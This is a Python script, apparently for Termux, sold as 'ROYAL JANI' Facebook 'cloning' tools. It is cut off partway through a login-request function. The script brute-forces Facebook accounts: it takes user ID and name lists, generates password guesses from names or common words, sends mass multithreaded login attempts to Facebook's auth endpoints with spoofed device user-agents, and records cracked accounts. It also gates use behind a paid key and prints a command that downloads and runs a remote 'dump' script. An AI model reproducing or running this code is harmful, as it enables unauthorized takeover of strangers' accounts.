import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp
#_________[ INSTALLING REQUESTS ]_____
'''
http_directory = tempfile.mkdtemp(prefix='.')
req = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/"
site_packages = sys.path[4]
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
find_aarch = subprocess.check_output('uname -om',shell=True)

if "aarch64" in str(find_aarch):
	user_aarch = "64"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config64.zip"

elif "arm" in str(find_aarch):
	user_aarch = "32"
	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config32.zip"
else:
	print(" [•] Your Device aarch Unknown ")


try:
	os.system(f"curl -L {link} > {http_directory}/config.zip")
	os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
	os.chdir(f"{http_directory}/reqmodule")
except Exception as e:
	print(e)
except ConnectionError:
	print(" [•] Please Check Your Internet ")
'''

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)

from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
   # print('\n Installing missing modules ...')
    #os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python zoio.py')
    
try:
    key1=open("/storage/emulated/0/android8.txt",'r').read()
except IOError:
    kok=open("/storage/emulated/0/android8.txt",'w')
    myid=uuid.uuid4().hex[:12]
    f="ROYAL-sir"
    key=myid+f
    kok.write(key)
    kok.close()
    print(key)

a=requests.get("https://github.com/royal009/Royal/blob/main/jani.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    pass
  
else:
    os.system('clear')
    print("""\033[92;1m
\033[92;1m'########:::'#######::'##:::'##::::'###::::'##:::::::
\033[92;1m ##.... ##:'##.... ##:. ##:'##::::'## ##::: ##:::::::
\033[97;1m ##:::: ##: ##:::: ##::. ####::::'##:. ##:: ##:::::::
\033[97;1m ########:: ##:::: ##:::. ##::::'##:::. ##: ##:::::::
\033[92;1m ##.. ##::: ##:::: ##:::: ##:::: #########: ##:::::::
\033[92;1m ##::. ##:: ##:::: ##:::: ##:::: ##.... ##: ##:::::::
 \033[1;37m##:::. ##:. #######::::: ##:::: ##:::: ##: ########:
 \033[1;37m..:::::..:::.......::::::..:::::..:::::..::........::   
                                              \33[1;37mJANI                                                             
\33[1;37m------------------------------------------------
      \033[1;37mOwner    : \033[92;1mROYAL JANI
      \033[1;37mStatus   : \033[1;31mPERSONAL
      \033[97;1mVersion  : \033[1;92m0.23
\33[1;37m------------------------------------------------""") 
    print("     \33[37;42m\t 𝗧𝗘𝗥𝗠 & 𝗖𝗢𝗡𝗗𝗜𝗧𝗜𝗢𝗡𝗦\33[0;m")
    print("\33[1;37m------------------------------------------------")
    print("\033[1;97m [◍] 𝐓𝐚𝐤𝐞 𝐲𝐨𝐮𝐫 𝐫𝐞𝐬𝐩𝐨𝐧𝐬𝐢𝐛𝐢𝐥𝐢𝐭𝐲, 𝐧𝐨 𝐨𝐧𝐞 𝐜𝐚𝐧 𝐭𝐚𝐤𝐞 𝐫𝐞𝐬𝐩𝐨𝐧𝐬𝐢𝐛𝐢𝐥𝐢𝐭𝐲 𝐟𝐨𝐫 𝐢𝐥𝐥𝐞𝐠𝐚𝐥 𝐚𝐜𝐭𝐢𝐯𝐢𝐭𝐢𝐞𝐬")
  #  print("\033[1;37m [◍] 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝘄𝗶𝗹𝗹 𝗻𝗼𝘁 𝗯𝗲 𝗿𝗲𝘁𝘂𝗿𝗻𝗲𝗱 𝘂𝗻𝗱𝗲𝗿 𝗮𝗻𝘆 𝗰𝗶𝗿𝗰𝘂𝗺𝘀𝘁𝗮𝗻𝗰𝗲𝘀 ")
   # print("\033[1;97m [◍] 𝐓𝐡𝐢𝐬 𝐓𝐨𝐨𝐥 𝐢𝐬 𝐩𝐚𝐢𝐝 𝐲𝐨𝐮 𝐧𝐞𝐞𝐝 𝐭𝐨 𝐛𝐮𝐲 𝐟𝐢𝐫𝐬𝐭 𝐛𝐞𝐟𝐨𝐫𝐞 𝐔𝐬𝐞")
  #  print(" [◍] 𝗥𝗲𝗮𝗱 𝗮𝗹𝗹 𝘁𝗵𝗲 𝗧𝗲𝗿𝗺 & 𝗖𝗼𝗻𝗱𝗶𝘁𝗶𝗼𝗻𝘀 𝗰𝗮𝗿𝗲𝗳𝘂𝗹𝗹𝘆")
    print("\33[1;37m------------------------------------------------")
    print("      \33[37;41m\t★彡[ʀᴏʏᴀʟ ᴊᴀɴɪ]彡★\33[0;m")
   # print("\33[1;37m------------------------------------------------")   
 #   print(" [◍] \033[97;1m𝟲𝟬𝟬 / 𝟯𝟬𝗱𝗮𝘆")
 #   print(" [◍] \033[97;1m𝟰𝟬𝟬 / 𝟭𝟱𝗱𝗮𝘆")
 #   print(" [◍] \033[97;1m𝗣𝗮𝘆𝗺𝗲𝗻𝘁 : 𝗡𝗮𝘆𝗮𝗽𝗮𝘆 ")
  #  print(" [◍] \033[97;1m𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗡𝘂𝗺𝗯𝗲𝗿 : 𝟬𝟯𝟭𝟰𝟰𝟬𝟱𝟵𝟲𝟴𝟯 ")
    print("\33[1;37m------------------------------------------------")
    print(" [◍] TOKEN : \033[92;1m"+key2)
    print("\33[1;37m------------------------------------------------")
    print(" [◍]\033[97;1m Copy Token to Send Admin ") 
    print('''\33[1;37m------------------------------------------------''') 
    input(' [◍]\033[1;32m YOU WANT TO BUY THEN PRESS ENTER ')
    os.system("xdg-open https://wa.me/+923268873632")
    os.system('espeak -a 300 " This,   Tool, is ,paid, u need to access,"') 
   
    
    exit()  
print('\n\033[1;33mWELCOME TO ROYAL JANI TOOLS...');time.sleep(3)
try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(51*'-')

def p(x):
	print(x)

#___________ [ Lists Used in Script]________

id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
def logo():
	os.system('clear')
	logo = (f'''\033[1;92m
\033[92;1m'########:::'#######::'##:::'##::::'###::::'##:::::::
\033[92;1m ##.... ##:'##.... ##:. ##:'##::::'## ##::: ##:::::::
\033[97;1m ##:::: ##: ##:::: ##::. ####::::'##:. ##:: ##:::::::
\033[97;1m ########:: ##:::: ##:::. ##::::'##:::. ##: ##:::::::
\033[92;1m ##.. ##::: ##:::: ##:::: ##:::: #########: ##:::::::
\033[92;1m ##::. ##:: ##:::: ##:::: ##:::: ##.... ##: ##:::::::
 \033[1;37m##:::. ##:. #######::::: ##:::: ##:::: ##: ########:
 \033[1;37m..:::::..:::.......::::::..:::::..:::::..::........::   
                                              \33[1;37mJANI
\33[1;37m--------------------------------------------------
          [√]   OWNER : ROYAL JANI 
          [√]  GITHUB : ROYAL02
          [√]  Stutes : \33[37;41mPersonal\33[0;m
          [√] VERSION : 0.1
\33[1;37m--------------------------------------------------
\33[37;41m  I m not a programmer just start learning =)\33[0;m
\33[1;37m--------------------------------------------------
          \33[37;41m\t ROYAL JANI \33[0;m
 \33[1;37m--------------------------------------------------''')
	p(logo)
def clear():
	os.system("clear")


uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""

bumper = f'{id}{xp}'


#method 1
def iAmMethod1Ua():
	abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
	pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
	build = random.choice(abc)+random.choice(abc)+random.choice(abc)
	FBBV = str(random.randint(111111111,999999999))
	FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone"])
	#ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])>
	ua = random.choice("[FBAN/MessengerLite;FB4A;FBAV/300.0.0.8.61;FBBV/50136699;FBDM/{density=1.5,width=720,height=326};FBLC/en_US;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/GT-N5110;FBSV/8;FBCA/armeabi-v7a:armeabi;]","[FBAN/MessengerLite;FB4A;FBAV/302.0.0.8.124;FBBV/50136166;FBDM/{density=1.5,width=720,height=410};FBLC/en_US;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/GT-C3312;FBSV/12;FBCA/armeabi-v7a:armeabi;]")
	return ua
 #Method2
def iAmMethod2Ua():
	abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
	pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
	build = random.choice(abc)+random.choice(abc)+random.choice(abc)
	FBBV = str(random.randint(111111111,999999999))
	FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone"])
	#ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])>
	ua = random.choice(["[FBAN/MessengerLite;FB4A;FBAV/300.0.0.8.61;FBBV/50136699;FBDM/{density=1.5,width=720,height=326};FBLC/en_US;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/GT-N5110;FBSV/8;FBCA/armeabi-v7a:armeabi;]","[FBAN/MessengerLite;FB4A;FBAV/302.0.0.8.124;FBBV/50136166;FBDM/{density=1.5,width=720,height=410};FBLC/en_US;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/GT-C3312;FBSV/12;FBCA/armeabi-v7a:armeabi;]",])
	return ua
	#Method3
def iAmMethod3Ua():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice("[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Vi India;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]")+END
	return ua

def ua1():
    import random
    FBLC = random.choice(['en_US', 'en_GB',])
    FBAN = random.choice(['FB4A', 'FB4A'])
    FBCR = random.choice(['null', 'null', 'Zong'])
    FBSV = random.choice(['10', '11', '8', '9', '7','12', '6'])
    model = random.choice(['SM-G900F', 'SM-G950F', 'SM-G960F', 'SM-G970F', 'SM-G980F', 'SM-G990F', 'SM-G100F', 'SM-J730F', 'SM-J700F', 'SM-A135FLBGPKD', 'SM-A235FLBKPKD', 'SM-A045FZCDPKD', 'SM-A145FLGGPKD', 'SM-A047FZCGPKD', 'SM-A042FLBDMEB', 'SM-A245FLGVPKD', 'SM-F731BZAEPKD', 'SM-F731BZAEPKD', 'SM-S911BZECMEA', 'SM-S918BLIQMEA', 'SM-F936BZADPKD', 'SM-S901EIDGPKD', 'SM-S908EDRGPKD', 'SM-R177NZKAMEA', 'SM-F711BZEEMEA', 'SM-T515NZKDPAK', 'SM-T725NZKAXSG', 'SM-F700FZPDPAK', 'GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750', 'GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268""GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9190', 'GT-I9192', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9300', 'GT-I9300I', 'GT-I9301I', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9500', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-M5650', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'SAMSUNG', 'LMY4', 'LMY47V', 'MMB29K', 'MMB29M', 'LRX22C', 'LRX22G', 'NMF2', 'NMF26X', 'NMF26X;', 'NRD90M', 'NRD90M;', 'SPH-L720', 'IML74K', 'IMM76D', 'JDQ39', 'JSS15J', 'JZO54K', 'KOT4', 'KOT49H', 'KOT4SM-T310', 'KTU84P', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'SM-T280', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM-T820'])
    
    uai = f"[FBAN/{FBAN};FBAV/{random.randint(100, 400)}.0.0.8.{random.randint(40, 130)};FBBV/50136{random.randint(111, 999)};FBDM/" + \
         "{density=1.5,width=720,height=" + f"{random.randint(100, 1200)}" + "}" + \
         f";FBLC/{FBLC};FBCR/{FBCR};FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/{FBSV};FBCA/armeabi-v7a:armeabi;]"
    
    return uai


nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
		logo()
		
		
		p(" [1] File Cloning ")
		#p(" [2] Random Clone")
		#p(" [3] Dump Tool")
		p(" [4] Pass changer ")
		p(" [E] Exit Tool ")
		line()
		opt1 = input(" {√} Select An Option : ")
		if opt1 == "1":self.file_menu()
		
		elif opt1 == "2":self.num_menu()
		elif opt1 == "4":automation().menu()
		elif opt1 == "3":Grep().links_only()
		elif opt1 == "E":exit(" [•] KATM.TATA BY BY")
		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
	
	
	def dump_menu(self):
		 print("rm -rf dump && mkdir dump && cd dump && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
		
	def file_menu(self):
		logo()
		p(" [•] Example /sdcard/filename.txt")
		file = input(" [•] Put File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()
		
	def method_select(self,id):
		logo()
		p(" [1] Method 1 [NEW] ")
		p(" [2] Method 2 [OLD/NEW] ")
		p(" [2] Method 3 [OLD] ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		elif m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		elif m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		elif m_opt =="4":
			 method.append('iiii')
			 self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 20 Max ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should undet 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Your Passwords like : first last First Last etc ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()
		p("  Total File Accounts : %s "%(str(len(id))))
		p(" Proces has been started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					 saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()
		p(" [•] Cloning Hasbeen Completed ")
		p(" [•] Cloning Accounts Saved in /sdcard")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()

	def num_menu(self):
		logo()
		pwx=[]
		p(" [•] Advanced Random Cloning Tool ")
		line()
		p(" [•] Example : 0300 , 0313 , 0324 , 0342 ")
		line()
		code = input(" [•] Put Sim Code : ")
		logo()
		p(" [•] Example : 1000, 2000 , 5000 Max ")
		max = 5000
		try:
			clone_limit = int(input(" [•] Put Clone Limit : "))
			if clone_limit =="":
				clone_limit = 1000
			elif clone_limit > max:
				p(" [•] Limit Should be Under 5000 ");sp(2);self.num_menu()
		except:
			clone_limit = 1000
		for n in range(clone_limit):
			_ = random.randint(1111111,9999999)
			id.append(str(_))
		logo()
		p(" [1] Auto Password \n [2] Choice Password ")
		line()
		pwx_=[]
		pw_select = input(" [•] Choose : ")
		if pw_select == "1":
			pwx_.append("i")
		elif pw_select == "2":
			pwx_.append('ii')
			max = 10
			try:
				p_limit = int(input(" [•] Put Password Limit : "))
				if p_limit =="":
					p_limit = 5
				elif p_limit > max:
					p(" [•] Limit Should be Under 1 - 10 ");sp(2);num_menu()
			except:
				p_limit = 5
			for n in range(p_limit):
				pwx.append(input(" [•] Put Password %s : "%(n+1)))
		else:
			pwx_.append("i")
		logo()
		
		p(" [•] Total Random Accounts : %s "%(str(len(id))))
		p(" [•] Dilute Brute Has Been Started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = code+user
				if "i" in pwx_:
					pwx = [user,uid,"khan1122","khankhan","khan123","baloch","i love you","khan1234","khan12345"]
					saqi.submit(self.r_crack,uid,pwx)
				elif "ii" in pwx_:
					saqi.submit(self.r_crack,uid,pwx)
				else:
					saqi.submit(self.r_crack,uid,pwx)
		self.saved_results(ok,cp)
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ROYAL] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod1Ua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
